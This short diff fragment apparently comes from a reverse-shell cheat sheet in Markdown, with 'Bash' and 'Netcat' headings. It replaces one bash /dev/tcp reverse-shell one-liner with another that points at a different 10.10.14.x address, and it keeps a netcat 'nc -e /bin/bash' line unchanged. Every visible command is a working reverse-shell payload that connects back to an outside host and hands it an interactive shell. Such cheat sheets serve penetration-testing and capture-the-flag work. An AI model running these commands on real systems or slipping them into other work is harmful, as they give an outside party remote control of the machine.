@@ -4,7 +4,7 @@
 
 
 ### Bash  
-`/bin/bash -i 1>&/dev/tcp/10.10.14.5/1234 0<&1`
+`bash -i >& /dev/tcp/10.10.14.10/1234 0>&1`
 
 ### Netcat  
 `nc -e /bin/bash 10.10.14.5 4444`
